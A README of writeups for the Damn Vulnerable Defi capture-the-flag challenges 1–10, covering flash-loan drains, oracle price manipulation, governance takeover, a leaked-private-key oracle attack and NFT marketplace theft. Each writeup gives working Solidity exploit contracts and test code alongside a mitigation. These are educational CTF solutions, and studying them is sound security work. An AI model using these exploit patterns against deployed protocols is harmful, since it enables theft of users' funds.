# DamnVulnerableDefi-Solutions
My writeups for the Damn Vulnerable Defi challenges

## Challenge #1 - Unstoppable

There’s a tokenized vault with a million DVT tokens deposited. It’s offering flash loans for free, until the grace period ends.

To pass the challenge, make the vault stop offering flash loans.

You start with 10 DVT tokens in balance.

### `UnstoppableVault.sol`: Transferring asset tokens directly to the vault results in the contract denial of service

Function `flashLoan` compares it's asset tokens balance with a result of converting all available shares into asset tokens 
```
    function totalAssets() public view override returns (uint256) {
        assembly { // better safe than sorry
            if eq(sload(0), 2) {
                mstore(0x00, 0xed3ba6a6)
                revert(0x1c, 0x04)
            }
        }
        return asset.balanceOf(address(this));
    }
```

```
uint256 balanceBefore = totalAssets();
        if (convertToShares(totalSupply) != balanceBefore) revert InvalidBalance(); // enforce ERC4626 requirement
```
with the goal of making sure that at the moment of function execution there are no discrepancies in an accounting

This strict check gives us an opportunity to disrupt contract functionality with a direct transfer of the asset tokens to the vault which leads to an increase of it's balance and the discrepancy that we discussed above.

### Proof of concept

Paste the following block of code in the `unstoppable.challenge.js`

```
    it('Execution', async function () {
        /** CODE YOUR SOLUTION HERE */
        await token.connect(player).transfer(vault.address, 100);
    });

```

### Mitigation

We need to make sure that we use only asset tokens that we receive from the user's deposits in an accounting, thus we need to modify the contract as follows

1. Create new storage variable `uint256 _assetBalance`
2. Modify it inside deposit function
```
    function _deposit(address caller, address receiver, uint256 assets, uint256 shares) internal virtual {
        SafeERC20.safeTransferFrom(_asset, caller, address(this), assets);
        _assetBalance += assets;
        _mint(receiver, shares);

        emit Deposit(caller, receiver, assets, shares);
    }
```
3. Rewrite `totalAssets`
```
    function totalAssets() public view override returns (uint256) {
        assembly { // better safe than sorry
            if eq(sload(0), 2) {
                mstore(0x00, 0xed3ba6a6)
                revert(0x1c, 0x04)
            }
        }
        return _assetBalance;
    }
```

## Challenge #2 - Naive receiver

There’s a pool with 1000 ETH in balance, offering flash loans. It has a fixed fee of 1 ETH.

A user has deployed a contract with 10 ETH in balance. It’s capable of interacting with the pool and receiving flash loans of ETH.

Take all ETH out of the user’s contract. If possible, in a single transaction.

### `NaiveReceiverLenderPool.sol`: Anyone can call `flashLoan` function causing unsuspecting borrowers to lose their tokens

`flashLoan` is a permitionless function that exetutes a flash loan while simultaneously taking 1 ETH fee from the borrower. Hacker can call this function with any contract address, that implemented `onFlashLoan` function, and a zero `amount` loan causing the borrower to pay the fees and draining it's balance.

### Proof of concept

Here is the simple contract which can drain any borrower's balance

```
// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/interfaces/IERC3156FlashLender.sol";
import "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";

contract NaiveExploit {
    IERC3156FlashLender public immutable pool;
    address private constant ETH = 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE;

    constructor (IERC3156FlashLender _pool) {
        pool = _pool;
    }

    function attack(IERC3156FlashBorrower target) public {
          while(address(target).balance > 0) {
              pool.flashLoan(target, ETH, 0, "0x");
          }
    }
}
```

Deploy and call `attack` function inside `naive-receiver.challenge.js`

```
    it('Execution', async function () {
        /** CODE YOUR SOLUTION HERE */
        const Exploit = await ethers.getContractFactory('NaiveExploit');
        exploit = await Exploit.deploy(pool.address);

        await exploit.connect(player).attack(receiver.address);
    });
```

### Mitigation

Allow only borrower contract to call `flashLoan` function

```
 function flashLoan(
        IERC3156FlashBorrower receiver,
        address token,
        uint256 amount,
        bytes calldata data
    ) external returns (bool) {
    if (msg.sender != address(receiver) revert NotABorrower();
    ...
```

## Challenge #3 - Truster
More and more lending pools are offering flash loans. In this case, a new pool has launched that is offering flash loans of DVT tokens for free.

The pool holds 1 million DVT tokens. You have nothing.

To pass this challenge, take all tokens out of the pool. If possible, in a single transaction.

### `TrusterLenderPool.sol`: `flashLoan` function allows executing any malicious code via target.functionCall()

Hackers can execute any code with pool addres as a `msg.sender`, we can call `flashLoan` function with DVT token address as a `target` and encoded `approve` function payload as a `data`, thus we can approve all DVT in pool's posession to be spended by anyone.

### Proof of concept

Attaker's contract

```
// SPDX-License-Identifier: MIT

import "../truster/TrusterLenderPool.sol";

pragma solidity ^0.8.0;

contract TrusterExploit {
    TrusterLenderPool public immutable pool;
    ERC20 public immutable token;
    bytes private evilData = abi.encodeWithSignature("approve(address,uint256)", address(this), type(uint256).max); 

    constructor (TrusterLenderPool _pool, ERC20 _token) {
        pool = _pool;
        token = _token;
    }

    function attack() public {
        uint256 bal = token.balanceOf(address(pool));
        pool.flashLoan(0, address(this), address(token), evilData);
        token.transferFrom(address(pool), msg.sender, bal); 
    }
}
```

Paste the following inside a `truster.challenge.js`

```
    it('Execution', async function () {
        /** CODE YOUR SOLUTION HERE */
        const Exploit = await ethers.getContractFactory('TrusterExploit');
        exploit = await Exploit.deploy(pool.address, token.address);

        await exploit.connect(player).attack();
    });
```

This will trnasfer all DVT from pool to the player address

### Mitigation

Allow only trusted payload to be sent by the pool contract, remove `data` parameter from the `flashLoan` function 

```
 function flashLoan(uint256 amount, address borrower, address target)
        external
        nonReentrant
        returns (bool)
    {
        uint256 balanceBefore = token.balanceOf(address(this));
        bytes memory trustedPayload = abi.encodeWithSignature("onFlashLoan(address, address, uint256)", borrower, address(token), amount);

        token.transfer(borrower, amount);
        target.functionCall(trustedPayload);
        ...
```

## Challenge #4 - Side Entrance
A surprisingly simple pool allows anyone to deposit ETH, and withdraw it at any point in time.

It has 1000 ETH in balance already, and is offering free flash loans using the deposited ETH to promote their system.

Starting with 1 ETH in balance, pass the challenge by taking all ETH from the pool.

### `SideEntranceLenderPool.sol`: pool ETH accounting allows loaning ETH and depositing it inside a pool in the same `flashLoan` transaction leading to a loss of funds from the pool

Hackers can call pool `deposit` function and deposit loaned ETH effectively stealing it from the pool without contract noticing it, `address(this).balance` check will return `true` which means `flasLoan` won't revert. But because `msg.value` in `deposit` call is added to `msg.sender` balance ownership of the funds is transfered from the pool to the malicious borrower contract.

### Proof of concept

Malicious borrower, notice `deposit` call inside `execute` funtion

```
// SPDX-License-Identifier: MIT

import "../side-entrance/SideEntranceLenderPool.sol";

pragma solidity ^0.8.0;

contract SideExploit {
    SideEntranceLenderPool public immutable pool;

    constructor (SideEntranceLenderPool _pool) {
        pool = _pool;
    }

    function attack() public {
        pool.flashLoan(address(pool).balance);

        pool.withdraw();
        msg.sender.call{value: address(this).balance}("");
    }

    function execute() public payable {
        pool.deposit{value: msg.value}();
    }

    receive() external payable {}
}
```

Hack inside `side-entrance.challenge.js`

```
    it('Execution', async function () {
        /** CODE YOUR SOLUTION HERE */
        const Exploit = await ethers.getContractFactory('SideExploit');
        exploit = await Exploit.deploy(pool.address);

        await exploit.connect(player).attack();
    });
```

### Mitigation

Use reentrancy modifiers to restrict a `deposit` call from the `flashLoan` function

## Challenge #5 - The Rewarder
There’s a pool offering rewards in tokens every 5 days for those who deposit their DVT tokens into it.

Alice, Bob, Charlie and David have already deposited some DVT tokens, and have won their rewards!

You don’t have any DVT tokens. But in the upcoming round, you must claim most rewards for yourself.

By the way, rumours say a new pool has just launched. Isn’t it offering flash loans of DVT tokens?

### `TheRewarderPool.sol`: Pool is vulnerable to flash loan attacks when malicious user deposits loaned tokens and then withdraws them at the same transaction

Pool uses `ERC20snapshot` token which allows to make a snaphot of a current period total supply and balances. This snapshot is made upon depositing to the pool, as a result we can loan some tokens deposit them which leads to a snapshot update and then withdraw them without losing our future reward.

### Proof of concept 

Attacker's contract

```
// SPDX-License-Identifier: MIT

import "../the-rewarder/FlashLoanerPool.sol";
import "../the-rewarder/TheRewarderPool.sol";

pragma solidity ^0.8.0;

contract RewarderExploit {
    FlashLoanerPool public immutable loanPool;
    TheRewarderPool public immutable rewardPool;
    ERC20 public immutable DVT;
    ERC20 public immutable rewardToken;

    constructor (FlashLoanerPool _loanPool, TheRewarderPool _rewardPool, ERC20 _DVT, ERC20 _rewardToken) {
        loanPool = _loanPool;
        rewardPool = _rewardPool;
        DVT = _DVT;
        rewardToken = _rewardToken;
    }

    function attack() public {
        uint256 bal = DVT.balanceOf(address(loanPool));
        loanPool.flashLoan(bal);
        
        bal = rewardToken.balanceOf(address(this));
        rewardToken.transfer(msg.sender, bal);
    }

    function receiveFlashLoan(uint256 amount) public {
        DVT.approve(address(rewardPool), type(uint256).max);
        
        rewardPool.deposit(amount);
        rewardPool.withdraw(amount);
        
        DVT.transfer(address(loanPool), amount);
    }
}
```

Usage in test file `the-rewarder.challenge.js`

```
    it('Execution', async function () {
        /** CODE YOUR SOLUTION HERE */
        const Exploit = await ethers.getContractFactory('RewarderExploit');
        exploit = await Exploit.deploy(
            flashLoanPool.address,
            rewarderPool.address,
            liquidityToken.address,
            rewardToken.address
        );
        // Advance time 5 days so that depositors can get rewards
        await ethers.provider.send("evm_increaseTime", [5 * 24 * 60 * 60]); // 5 days

        await exploit.connect(player).attack();
    });
```

### Mitigation

We can add a cooldown period, so users cannot withdraw tokens from the pool at the same transaction

```
uint256 private _cooldown;
mapping(address => uint256) private _lastDepositCall;

function deposit(uint256 amount) external {
    _lastDepositCall[msg.sender] = block.timestamp
    ...
```
```
function withdraw(uint256 amount) external {
    if(block.timestamp - _lastDepositCall[msg.sender] < cooldow) revert onCooldown();
    ...
```

## Challenge #6 - Selfie
A new cool lending pool has launched! It’s now offering flash loans of DVT tokens. It even includes a fancy governance mechanism to control it.

What could go wrong, right ?

You start with no DVT tokens in balance, and the pool has 1.5 million. Your goal is to take them all.

### `SimpleGovernance.sol`: governance is vulnerable to a flash loan attack when an attacker takes a loan and queues malicious action in the same transaction

Inside `queueAction` function we check sender balance to be bigger than the half of the total governance token supply 

```
    function _hasEnoughVotes(address who) private view returns (bool) {
        uint256 balance = _governanceToken.getBalanceAtLastSnapshot(who);
        uint256 halfTotalSupply = _governanceToken.getTotalSupplyAtLastSnapshot() / 2;
        return balance > halfTotalSupply;
    }
```
Governance token is ERC20Snaphot contract which allows to save user balance at a given time via `snapshot` function, therefore someone can take a big enough loan, create a snaphot and pass a malicious queue action, for example emergency drain all funds from the pool.

### Proof of concept

Attacker's contract fragment, here we propose action with loaned governance tokens

```
    function attack() public {
        DVT.approve(address(pool), type(uint256).max); 
        uint256 bal = DVT.balanceOf(address(pool));
        pool.flashLoan(this, address(DVT), bal, "0x");
    }

    function onFlashLoan(
        address initiator,
        address token,
        uint256 amount,
        uint256 fee,
        bytes calldata data
    ) public returns(bytes32){
        bytes memory evilData = abi.encodeWithSignature("emergencyExit(address)", receiver);
        DVT.snapshot();
        actionId = governance.queueAction(address(pool), 0, evilData);
        return CALLBACK_SUCCESS;
    }
```

Inside `selfie.challenge.js` we launch the atack then wait for the proposal to cooldown and execute it

```
    it('Execution', async function () {
        /** CODE YOUR SOLUTION HERE */
        const Exploit = await ethers.getContractFactory('SelfieExploit', player);
        exploit = await Exploit.deploy(pool.address, governance.address, token.address);

        await exploit.connect(player).attack();
        // Wait min governance cooldown time
        await ethers.provider.send("evm_increaseTime", [2 * 24 * 60 * 60]); // 2 days
        // Execute action
        let id = await exploit.actionId()
        await governance.connect(player).executeAction(id);
    });
```

### Mitigation

We need to separate token `snapshot` function so it can't be called in the same transaction with action queueing. Inside the token contract
```
function snapshot() onlyGovernance {
...
}
```
We add modifier so it can only be called from  the governance contract and then we modify `SimpleGovernance.sol`

```
function createSnapshot() nonReentrant {
    _governanceToken.snapshot();
}

fuction queueAction(...) nonReentrant {
...
}
```

Adding nonReentrant modifiers will separate voting logic from the snapshot creation, this will allow us to drop any transaction that tries to queue an action and update the snapshot in the same transaction like in an attack that we've discussed.

## Challenge #7 - Compromised
While poking around a web service of one of the most popular DeFi projects in the space, you get a somewhat strange response from their server. Here’s a snippet:

```
HTTP/2 200 OK
content-type: text/html
content-language: en
vary: Accept-Encoding
server: cloudflare

4d 48 68 6a 4e 6a 63 34 5a 57 59 78 59 57 45 30 4e 54 5a 6b 59 54 59 31 59 7a 5a 6d 59 7a 55 34 4e 6a 46 6b 4e 44 51 34 4f 54 4a 6a 5a 47 5a 68 59 7a 42 6a 4e 6d 4d 34 59 7a 49 31 4e 6a 42 69 5a 6a 42 6a 4f 57 5a 69 59 32 52 68 5a 54 4a 6d 4e 44 63 7a 4e 57 45 35

4d 48 67 79 4d 44 67 79 4e 44 4a 6a 4e 44 42 68 59 32 52 6d 59 54 6c 6c 5a 44 67 34 4f 57 55 32 4f 44 56 6a 4d 6a 4d 31 4e 44 64 68 59 32 4a 6c 5a 44 6c 69 5a 57 5a 6a 4e 6a 41 7a 4e 7a 46 6c 4f 54 67 33 4e 57 5a 69 59 32 51 33 4d 7a 59 7a 4e 44 42 69 59 6a 51 34
```

A related on-chain exchange is selling (absurdly overpriced) collectibles called “DVNFT”, now at 999 ETH each.

This price is fetched from an on-chain oracle, based on 3 trusted reporters: 0xA732...A105,0xe924...9D15 and 0x81A5...850c.

Starting with just 0.1 ETH in balance, pass the challenge by obtaining all ETH available in the exchange.

## Trusted source private keys leak

After a quick look at the oracle contract we see that the only way to manipulate a NFT price is by impersonating the trusted source from which the oracle gets it's prices. Even more we need to impersonate at least two sources because the oracle calculates a median price.

```
function postPrice(string calldata symbol, uint256 newPrice) external onlyRole(TRUSTED_SOURCE_ROLE) {
        _setPrice(msg.sender, symbol, newPrice);
    }
```

Let's take a look at the encoded message, it seems like these are hex encoded ASCII symbols. Let's decode them.

```
MHhjNjc4ZWYxYWE0NTZkYTY1YzZmYzU4NjFkNDQ4OTJjZGZhYzBjNmM4YzI1NjBiZjBjOWZiY2RhZTJmNDczNWE5
MHgyMDgyNDJjNDBhY2RmYTllZDg4OWU2ODVjMjM1NDdhY2JlZDliZWZjNjAzNzFlOTg3NWZiY2Q3MzYzNDBiYjQ4
```

Looks like a base64 strings. Decoding them will give us

```
0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9
0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48

```

...private keys(!). Let's hope they belong to oracle sources.

```
    it('Execution', async function () {
        /** CODE YOUR SOLUTION HERE */
        const keys = [
            '0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9',
            '0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48'
        ];
        let source;
        for(let i=0; i<keys.length; i++) {
            source =  new ethers.Wallet(keys[i], ethers.provider);
            await oracle.connect(source).postPrice("DVNFT", 0);
        }
        await exchange.connect(player).buyOne({value: 1});

        for(let i=0; i<keys.length; i++) {
            source =  new ethers.Wallet(keys[i], ethers.provider);
            await oracle.connect(source).postPrice("DVNFT", INITIAL_NFT_PRICE);
        }
        await nftToken.connect(player).approve(exchange.address, 0);
        await exchange.connect(player).sellOne(0);
    });
```

Success! With sources private keys we managed to lower the NFT price to zero, buy it and after that sell it for it's full price.

### Mitigation

Exposing private keys on the web is never a good idea

## Challenge #8 - Puppet
There’s a lending pool where users can borrow Damn Valuable Tokens (DVTs). To do so, they first need to deposit twice the borrow amount in ETH as collateral. The pool currently has 100000 DVTs in liquidity.

There’s a DVT market opened in an old Uniswap v1 exchange, currently with 10 ETH and 10 DVT in liquidity.

Pass the challenge by taking all tokens from the lending pool. You start with 25 ETH and 1000 DVTs in balance.

## `PuppetPool.sol`: dangerous pool balances accounting

To borrow DVT tokens user must pay a collateral in ETH tokens which is an equivalent of the loan multiplied by 2. ETH/DVT price is sourced with the `computeOraclePrice` function which returns ratio of ETH amd DVT balances owned by the uniswap pair

`return uniswapPair.balance * (10 ** 18) / token.balanceOf(uniswapPair);`

Current ratio is 10:10, with liquidity this small it's pretty easy to manipulate the price.

## Proof of concept

Attacker contract. Here we are draining the pair with one swap of 1000 DVT tokens, which leaves pool with ratio ~ 0.09/1010, after this we can borrow 100000 DVT from the pool with a collateral equal to ~19 ETH

```
    function attack(uint256 tokenAmountIn, uint256 tokenAmountOut) external payable {
        DVT.transferFrom(msg.sender, address(this), tokenAmountIn);
        DVT.approve(address(uniPool), tokenAmountIn);

        uint256 ethAmountOut = uniPool.tokenToEthSwapInput(tokenAmountIn, 1, block.timestamp * 2);
        pool.borrow{value: msg.value + ethAmountOut}(tokenAmountOut, msg.sender);
    }

    receive() external payable {}
```

Attack in tests `puppet.challenge.js `

```
    it('Execution', async function () {
        /** CODE YOUR SOLUTION HERE */
        const Exploit = await ethers.getContractFactory('PuppetExploit');
        exploit = await Exploit.deploy(lendingPool.address, uniswapExchange.address, token.address);

        await token.connect(player).approve(exploit.address, PLAYER_INITIAL_TOKEN_BALANCE);
        await exploit.connect(player).attack(
            PLAYER_INITIAL_TOKEN_BALANCE,
            POOL_INITIAL_TOKEN_BALANCE,
            {value: 99n * 10n ** 17n}
        );
    });
```

## Mitigation

Liquidity pool should have more tokens, so it will be harder to manipulate the spot price. Use Uniswap libs to calculate price as an output amount of a virtual swap.

## Challenge #9 - Puppet V2
The developers of the previous pool seem to have learned the lesson. And released a new version!

Now they’re using a Uniswap v2 exchange as a price oracle, along with the recommended utility libraries. That should be enough.

You start with 20 ETH and 10000 DVT tokens in balance. The pool has a million DVT tokens in balance. You know what to do.

## `PuppetV2Pool.sol`: small uniswap liquidity pool allows to manipulate the price

Again like in the previous, the pool is small enough to greatly move the price with a single swap.

## Proof of concept

Swapping 10000 DVT is enough to reduce the price. Now we need only ~30 ETH to borrow 100000 DVT.
```
    it('Execution', async function () {
        /** CODE YOUR SOLUTION HERE */
        await token.connect(player).approve(uniswapRouter.address, PLAYER_INITIAL_TOKEN_BALANCE);
        await uniswapRouter.connect(player).swapExactTokensForETH(
            PLAYER_INITIAL_TOKEN_BALANCE,
            0,
            [token.address, weth.address],
            player.address,
            (await ethers.provider.getBlock('latest')).timestamp * 2
            
        );
        let wethAmount = await lendingPool.calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE);
        await weth.connect(player).deposit({value: wethAmount});
        await weth.connect(player).approve(lendingPool.address, wethAmount);
        await lendingPool.connect(player).borrow(POOL_INITIAL_TOKEN_BALANCE);
    });
```
## Mitigation

Use time weighted oracle. Create deeper liquidity pools.

## Challenge #10 - Free Rider
A new marketplace of Damn Valuable NFTs has been released! There’s been an initial mint of 6 NFTs, which are available for sale in the marketplace. Each one at 15 ETH.

The developers behind it have been notified the marketplace is vulnerable. All tokens can be taken. Yet they have absolutely no idea how to do it. So they’re offering a bounty of 45 ETH for whoever is willing to take the NFTs out and send them their way.

You’ve agreed to help. Although, you only have 0.1 ETH in balance. The devs just won’t reply to your messages asking for more.

If only you could get free ETH, at least for an instant.

## `FreeRiderNFTMarketplace.sol`: when buying multiple tokens market compares msg.value to a price of a single token instead of a whole batch

Users are allowed to buy tokens in batches with the payable function `buyMany`, inside this there is a loop which iterates through all `tokenId`s in the batch and calls `_buyOne` function, where msg.value is compared with a `tokenId` price, thus one is able to pass msg.value amount equal to a price of a single token.

## `FreeRiderNFTMarketplace.sol`: wrong token owner inside `buyOne` function, price is being sent not to the initial seller, but to the new owner

`ownerOf(tokenId)` is changed during  the `safeTransferFrom`. As a result market sends ETH to a buyer instead of a seller.

```
        // transfer from seller to buyer
        DamnValuableNFT _token = token; // cache for gas savings
        _token.safeTransferFrom(_token.ownerOf(tokenId), msg.sender, tokenId);

        // pay seller using cached token
        payable(_token.ownerOf(tokenId)).sendValue(priceToPay);
```

## Proof of concept

Contract which allows us to get money from the Uniswap with their flash swap feature, buy all tokens from the market and send them to the bounty contract

```
contract RiderExploit {
    FreeRiderNFTMarketplace public immutable market;
    ERC721 public immutable nft;
    IUniswapV2Pair public immutable pair;
    address public reward;

    uint256[] private ids = [0, 1, 2, 3, 4, 5];

    constructor (FreeRiderNFTMarketplace _market, ERC721 _nft, IUniswapV2Pair _pair, address _reward) {
        market = _market;
        nft = _nft;
        pair = _pair;
        reward = _reward;
    }

    function attack(uint256 wethAmount) external {
        pair.swap(wethAmount, 0, address(this), "0x");
        uint256 bal = address(this).balance;
        msg.sender.call{value: bal}("");
    }

    function uniswapV2Call(address sender, uint amount0, uint amount1, bytes calldata data) external {
        IWETH weth = IWETH(pair.token0());
        // buy nft
        weth.withdraw(amount0);        
        market.buyMany{value: amount0}(ids);
        // transfer nft to rewarder
        for(uint256 i=0; i<ids.length; i++) {
            nft.safeTransferFrom(address(this), reward, ids[i], abi.encode(address(this)));
        }
        // return tokens to uniswap
        // about 0.3% fee, +1 to round up
        uint256 fee = (amount0 * 3) / 997 + 1;
        uint256 amountToRepay = amount0 + fee;
        weth.deposit{value: amountToRepay}();
        weth.transfer(address(pair), amountToRepay);
    }

    function onERC721Received(
        address operator,
        address from,
        uint256 tokenId,
        bytes calldata data
    ) external pure returns (bytes4) {
        return this.onERC721Received.selector;
    }

    receive() external payable {}
}
```

Attack implementation in tests

```
    it('Execution', async function () {
        /** CODE YOUR SOLUTION HERE */
        const Exploit = await ethers.getContractFactory('RiderExploit');
        exploit = await Exploit.deploy(marketplace.address, nft.address, uniswapPair.address, devsContract.address);
        await weth.connect(player).deposit({value: 5n * 10n ** 16n});
        await weth.connect(player).transfer(exploit.address, 5n * 10n ** 16n);
        await exploit.connect(player).attack(NFT_PRICE);
    });
```

## Mitigation

Accumulate `totalPrice` and compare it to `msg.value`. Pay the token price to the old owner (seller).

```
function buyMany(uint256[] calldata tokenIds) external payable nonReentrant {
        uint256 totalPrice;
        for (uint256 i = 0; i < tokenIds.length;) {
            unchecked {
                totalPrice += _buyOne(tokenIds[i]);
                ++i;
            }
        }
        
        if (msg.value < totalPrice)
            revert InsufficientPayment();

    }

    function _buyOne(uint256 tokenId) private returns(uint256){
        uint256 priceToPay = offers[tokenId];
        if (priceToPay == 0)
            revert TokenNotOffered(tokenId);
            
        --offersCount;

        // transfer from seller to buyer
        DamnValuableNFT _token = token; // cache for gas savings
        address seller = _token.ownerOf(tokenId);
        _token.safeTransferFrom(_token.ownerOf(tokenId), msg.sender, tokenId);

        // pay seller using cached token
        payable(seller).sendValue(priceToPay);

        emit NFTBought(msg.sender, tokenId, priceToPay);
        return priceToPay;
    }
```
